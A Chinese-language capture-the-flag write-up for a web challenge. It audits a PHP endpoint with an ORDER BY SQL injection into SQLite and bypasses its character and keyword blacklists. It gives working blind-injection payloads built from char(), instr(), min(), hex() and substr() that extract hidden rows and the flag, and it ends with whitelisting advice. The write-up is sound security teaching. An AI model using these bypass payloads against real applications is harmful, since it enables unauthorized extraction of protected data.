# GUET CTF - "内部保密文档系统" WriteUp

## 题目信息

- **平台**: GUET SEC CTF
- **类型**: Web / SQL 注入
- **难度**: Medium
- **目标**: 绕过严格的字符与关键词过滤，从 SQLite 数据库中盲注出 Flag

---

## 一、信息收集

访问题目地址 `http://ctf.guetsec.cn:30030/`，页面是一个"内部保密文档系统"，提供两个排序按钮（按 ID / 按名称），底层调用 API：

```
GET /?action=api&order=id
```

页面右上角有"查看页面源码"链接，直接获取 PHP 源码。

---

## 二、代码审计

```php
<?php
error_reporting(0);

if (isset($_GET['action']) && $_GET['action'] === 'api') {
    header('Content-Type: application/json');
    $order = $_GET['order'] ?? 'id';

    // 第一层过滤：字符黑名单
    if (preg_match('/[\'":;=<>!|&~^%\-\+\*\/]/', $order)) {
        die(json_encode(["error" => "安全拦截：请求参数异常 (0x01)"]));
    }

    // 第二层过滤：关键词黑名单
    if (preg_match('/\b(in|is|like|glob|match|regexp|and|or|not|iif|case|if|when|then|else|where|union|join|nullif|coalesce)\b/i', $order)) {
        die(json_encode(["error" => "安全拦截：请求参数异常 (0x02)"]));
    }

    try {
        $db = new PDO("sqlite:/tmp/ctf.db");
        $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        $query = "SELECT id, name, upload_date FROM files WHERE is_secret = 0 ORDER BY $order";
        $stmt = $db->query($query);
        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);

        echo json_encode(["status" => "success", "data" => $results]);
    } catch (Exception $e) {
        echo json_encode(json_encode(["error" => "数据库查询异常"]));
    }
    exit;
}
```

### 关键信息

| 项目 | 内容 |
|---|---|
| 数据库 | SQLite（轻量级数据库，符合题目描述） |
| 注入点 | `ORDER BY $order` 直接拼接 |
| 表名 | `files` |
| 已知列 | `id`, `name`, `is_secret`, `upload_date` |
| 查询条件 | `WHERE is_secret = 0`（机密文档被过滤） |
| 回显方式 | 成功返回数据 JSON，失败返回"数据库查询异常" |

---

## 三、过滤规则分析

### 字符黑名单（0x01）

```
' " : ; = < > ! | & ~ ^ % - + * /
```

被禁止的符号：
- 引号 → 无法写字符串字面量
- 等号/尖括号 → 无法做比较运算
- 加号/减号/乘号/除号/百分号 → 无法做算术运算
- 竖线/与号/波浪号/插入符 → 无法做位运算
- 分号 → 无法堆叠查询
- 冒号 → 无法用 blob 字面量 `x'...'`

### 关键词黑名单（0x02）

```
in, is, like, glob, match, regexp, and, or, not,
iif, case, if, when, then, else, where, union,
join, nullif, coalesce
```

被禁止的功能：
- 所有比较运算符（like, glob, match, regexp, in, is）
- 所有逻辑运算符（and, or, not）
- 所有条件语句（if, case, when, then, else, iif）
- WHERE 子句、UNION、JOIN
- nullif, coalesce

**结论：** 没有比较运算符、没有逻辑运算符、没有条件语句、没有引号。传统的盲注思路全部失效。

---

## 四、绕过思路

### 4.1 可用字符

不在黑名单中的字符：
- 英文字母（大小写）
- 数字
- 空格、逗号、点号、括号 `()`、方括号 `[]`

### 4.2 可用的 SQLite 函数

黑名单中**没有**的函数（关键武器）：

| 函数 | 作用 |
|---|---|
| `char(n1,n2,...)` | 从 ASCII 码生成字符串（绕过引号） |
| `substr(s, start, len)` | 截取子串 |
| `instr(s, sub)` | 查找子串位置，找不到返回 0 |
| `hex(s)` | 转十六进制 |
| `length(s)` | 字符串长度 |
| `min(a, b)` | 取最小值（模拟逻辑与） |
| `max(a, b)` | 取最大值（模拟逻辑或） |
| `group_concat(col)` | 聚合多行成一个字符串 |
| `upper()`, `lower()` | 大小写转换 |

### 4.3 盲注原理

页面只有两条公开数据：

| id | name |
|---|---|
| 1 | Zebra_Core_System_Docs |
| 2 | Apple_Network_Topology |

正常按 `id` 排序时，**id=1 在前，id=2 在后**。

当我们在 ORDER BY 中写 `substr(name, 1, 1)` 时：
- id=1 的 name 首字符是 `Z`
- id=2 的 name 首字符是 `A`
- 升序排序时 `A < Z`，所以 **id=2 排在前面**（排序反转）

**这就是布尔盲注的信号：**
- 排序正常（Zebra 在前）→ 条件为假
- 排序反转（Apple 在前）→ 条件为真

### 4.4 核心 Payload 公式

利用 `min()` 函数把"行特征"和"数据库条件"组合起来：

```sql
min(instr(name, char(90)), 条件值)
```

- `instr(name, char(90))` = `instr(name, 'Z')`
  - id=1（Zebra）：返回 1
  - id=2（Apple）：返回 0

- 当**条件值 = 0**（条件为假）：
  - id=1: `min(1, 0) = 0`
  - id=2: `min(0, 0) = 0`
  - 两行排序键相同 → **保持原始顺序**（Zebra 在前）

- 当**条件值 > 0**（条件为真）：
  - id=1: `min(1, 条件值) = 1`
  - id=2: `min(0, 条件值) = 0`
  - 排序键不同 → **排序反转**（Apple 在前）

完美！这样就把任意数据库条件映射到了排序结果的反转/正常。

---

## 五、利用过程

### 5.1 探测列名

先测试 files 表有哪些列：

```
order=flag      → 报错（列不存在）
order=secret    → 报错（列不存在）
order=content   → 报错（列不存在）
order=id        → 成功
order=name      → 成功
```

files 表只有 id, name, is_secret, upload_date 四个列，没有直接的 flag 列。

### 5.2 提取数据库结构（sqlite_master）

利用子查询绕过 WHERE 限制，从 `sqlite_master` 提取表名：

```sql
(SELECT group_concat(name) FROM sqlite_master)
```

逐字符提取 hex，得到表名：

```
files,sqlite_sequence
```

再提取建表语句（`sql` 列）：

```sql
CREATE TABLE files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    is_secret INTEGER DEFAULT 0,
    upload_date TEXT
)
```

确认 files 表没有 flag 列，Flag 一定藏在某一行的 `name` 字段中（`is_secret=1` 的机密文档）。

### 5.3 提取所有文档名

直接从 files 表聚合所有 name（绕过 `WHERE is_secret = 0`）：

```sql
(SELECT group_concat(name) FROM files)
```

用 `hex()` + `substr()` 逐字符提取，最终得到：

```
Zebra_Core_System_Docs,Apple_Network_Topology,GUET{SQL1t3_fUnct10ns_0nly_N0_sp4c3s}
```

---

## 六、Flag

```
GUET{SQL1t3_fUnct10ns_0nly_N0_sp4c3s}
```

Flag 含义：**"SQLite functions only, no spaces"** — 全程只用 SQLite 内置函数完成注入，不需要任何比较运算符、逻辑运算符或条件语句。

---

## 七、完整 Payload 示例

### 基础探测：检查 sqlite_master 中是否包含字符 'f'

```
order=min(instr(name,char(90)),instr((SELECT group_concat(name) FROM sqlite_master),char(102)))
```

### 逐字符提取（hex 方式）

```
order=min(instr(name,char(90)),instr(substr((SELECT hex(group_concat(name)) FROM files),1,1),char(48)))
```

把 `1` 换成位置，把 `48`（'0' 的 ASCII）换成要猜的 hex 字符的 ASCII 码，遍历 0-9 和 A-F 即可逐字符提取。

---

## 八、总结

这道题的核心考点是 **SQLite 函数滥用**：

1. **`char()` 绕过引号过滤** — 不需要字符串字面量
2. **`instr()` 绕过比较运算符过滤** — 用函数返回值代替 `=` 比较
3. **`min()` 绕过逻辑运算符过滤** — 用函数代替 `and`
4. **子查询 + `group_concat()` 绕过 WHERE 过滤** — 直接查询所有行
5. **`hex()` + `substr()` 实现逐字符盲注** — 不需要任何条件语句

在"符号全禁、关键词全禁"的极端过滤下，只要数据库内置函数没有被完全封死，就依然可以完成完整的盲注攻击。这也提醒我们：**WAF 过滤不能只靠黑名单，必须采用白名单机制**（比如 ORDER BY 只允许预定义的列名）。
